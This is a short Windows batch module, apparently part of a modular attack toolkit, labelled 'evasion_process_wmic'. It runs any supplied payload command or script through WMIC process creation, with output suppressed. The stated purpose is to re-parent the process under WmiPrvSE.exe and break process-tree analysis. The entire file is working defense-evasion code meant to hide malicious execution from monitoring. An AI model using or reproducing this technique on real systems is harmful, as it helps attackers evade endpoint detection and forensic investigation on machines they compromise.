REM provides: evasion_process_wmic
REM depends: (none)
REM description: Execute commands via WMIC process create to change parent PID to WmiPrvSE.exe

REM WMIC process creation re-parents child under WmiPrvSE.exe
REM This breaks process tree analysis that traces cmd.exe lineage

REM Execute the payload command through WMIC
if defined PAYLOAD_CMD (
    wmic process call create "cmd /c %PAYLOAD_CMD%" >nul 2>nul
)

REM Alternative: execute a script file through WMIC
if defined PAYLOAD_PATH (
    wmic process call create "cmd /c \"%PAYLOAD_PATH%\"" >nul 2>nul
)
